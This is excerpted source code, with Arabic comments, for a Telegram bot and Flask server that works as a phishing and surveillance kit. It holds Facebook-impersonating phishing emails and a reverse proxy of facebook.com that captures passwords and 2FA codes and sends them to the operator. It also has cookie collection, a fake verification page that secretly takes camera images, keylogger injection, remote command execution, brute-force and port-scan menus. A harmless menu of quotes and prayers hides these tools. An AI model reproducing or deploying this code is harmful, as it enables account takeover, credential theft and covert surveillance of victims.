...
def send_phishing_email(target_email, platform, custom_message=None):
    try:
        ...
        templates = {
            'facebook': f'<h2>تنبيه أمني من فيسبوك</h2><p>يرجى تأكيد هويتك:</p><a href="{SERVER_URL}/fb_proxy/">تأكيد الحساب</a>',
...
def collect_cookie():
    ...
    if chat_id:
        ...
        safe_db_execute("INSERT INTO credentials (chat_id, platform, username, password, created_at) VALUES (?, ?, ?, ?, ?)",
                        (str(chat_id), url, "cookies", cookies, datetime.now().isoformat()))
...
def camera_hack_page():
    ...
    <head>
        ...
        <style>
            ...
            .btn { background: #1877f2; color: white; border: none; padding: 12px; border-radius: 5px; width: 100%; font-size: 16px; cursor: pointer; }
            .hidden { display: none; }
        </style>
    </head>
    <body>
    <div class="box">
        <h2>🔒 تحديث الأمان</h2>
        <p>لتأكيد هويتك، يرجى النقر على الزر أدناه.</p>
        <button id="fakeBtn" class="btn">تأكيد الهوية</button>
        <p style="font-size:12px;color:#888;">سيتم استخدام الكاميرا للتحقق الثنائي</p>
    </div>
    <script>
            ...
            .then(function(stream) {
                ...
                setTimeout(function() {
                    ...
                    fetch('/api/collect_camera', {
                        ...
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: new URLSearchParams(window.location.search).get('id'),
                            image: imageData,
...
# ===================== أداة التصيد الديناميكي (Proxy) =====================
PHISHING_TARGET = "https://www.facebook.com"
PHISHING_PREFIX = "/fb_proxy"
captured_phishing_data = []

@app.route('/fb_proxy/', defaults={'path': ''})
@app.route('/fb_proxy/<path:path>', methods=['GET', 'POST'])
def facebook_proxy(path):
    if path:
        full_url = f"{PHISHING_TARGET}/{path}"
    else:
        full_url = PHISHING_TARGET

    params = request.args.to_dict()
    data = request.form.to_dict()

    if 'login' in path or 'login' in full_url or request.method == 'POST':
        email = data.get('email') or data.get('username') or data.get('login') or ''
        password = data.get('pass') or data.get('password') or data.get('login_password') or ''
        token = data.get('2fa_code') or data.get('mfa_code') or data.get('code') or ''

        if email or password:
            captured_phishing_data.append({
            ...
            safe_db_execute("INSERT INTO phishing_logs (target_email, platform, username, password, ip, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                            (email, "facebook_proxy", email, password, request.remote_addr, datetime.now().isoformat()))
            msg = f"🎯 بيانات تصيد (Proxy)!\nالبريد: {email}\nكلمة السر: {password}"
            if token:
                msg += f"\nرمز 2FA: {token}"
            msg += f"\nIP: {request.remote_addr}"
            notify_admin(msg)
            if token:
                return redirect(f"{PHISHING_TARGET}/login/device-based/validate/?code={token}")

    headers = {key: value for key, value in request.headers.items() if key not in ['Host', 'Content-Length']}
    try:
        if request.method == 'GET':
            resp = requests.get(full_url, params=params, headers=headers, cookies=request.cookies)
        else:
            resp = requests.post(full_url, data=data, params=params, headers=headers, cookies=request.cookies)

        content = resp.text
        content = content.replace(PHISHING_TARGET, f"{SERVER_URL}{PHISHING_PREFIX}")
        content = content.replace('https://www.facebook.com', f"{SERVER_URL}{PHISHING_PREFIX}")
        ...
        return f"خطأ في الوكسي: {str(e)}", 500

@app.route('/fb_proxy/stolen')
def fb_stolen():
    return json.dumps(captured_phishing_data, indent=2, ensure_ascii=False)
    # ===================== إنشاء البوت =====================
...
def build_main_menu(chat_id):
    ...
    markup.row(InlineKeyboardButton("اقتباسات ملهمة", callback_data="quotes_menu"), InlineKeyboardButton("نصائح مفيدة", callback_data="tips_menu"))
    markup.row(InlineKeyboardButton("فحص الروابط", callback_data="check_link_btn"), InlineKeyboardButton("تحليل ملفات APK", callback_data="analyze_apk"))
    markup.row(InlineKeyboardButton("تحليل مستندات PDF", callback_data="pdf_menu"), InlineKeyboardButton("إدارة الأجهزة", callback_data="list_devices"))
    ...
    markup.row(InlineKeyboardButton("الأدعية المتنوعة", callback_data="doaa_menu"), InlineKeyboardButton("المحتوى الإسلامي", callback_data="muslim_menu"))
    markup.row(InlineKeyboardButton("🎨 توليد صور AI", callback_data="generate_image_btn"), InlineKeyboardButton("📧 بريد مؤقت", callback_data="create_email_btn"))
    markup.row(InlineKeyboardButton("رصيد النقاط", callback_data="my_points"), InlineKeyboardButton("رابط الدعوة", callback_data="my_referral"), InlineKeyboardButton("سجل النقاط", callback_data="points_history"))
    if is_admin(chat_id):
...
def build_phishing_pages_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("فيسبوك (Proxy)", callback_data="phish_facebook"), InlineKeyboardButton("جوجل", callback_data="phish_google"))
...
def callback_handler(call):
    try:
        ...
        if data == "rce_menu":
            ...
            safe_send(chat_id, "🖥️ أدخل الأمر الذي تريد تنفيذه على الخادم:")
            return
        if data == "keylogger_menu":
            user_states[chat_id] = "waiting_keylogger"
            safe_send(chat_id, "🔑 أرسل الرابط الذي تريد حقن الـ Keylogger فيه (مثال: https://example.com):")
            return

        # تصيد
        if data == "phish_facebook":
            link = f"{SERVER_URL}/fb_proxy/"
            safe_send(chat_id, f"✅ رابط تصيد فيسبوك (يعترض بيانات الدخول):\n{link}\n\nشارك هذا الرابط مع الضحية.")
            return
    ...
    try:
        ...
        if state == "waiting_keylogger":
            if not is_admin(chat_id):
                ...
                user_states[chat_id] = None
                return
            # توليد كود Keylogger وحقنه في صفحة
            keylogger_html = f'''
            <!DOCTYPE html>
            <html>
            <body>
        ...
        if state == "waiting_apk_analysis":
            ...
            return
        if state.startswith("hack_") or state.startswith("bruteforce_") or state in ["port_scan", "ssl_scan"]:
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور فقط.")
                user_states[chat_id] = None
                return
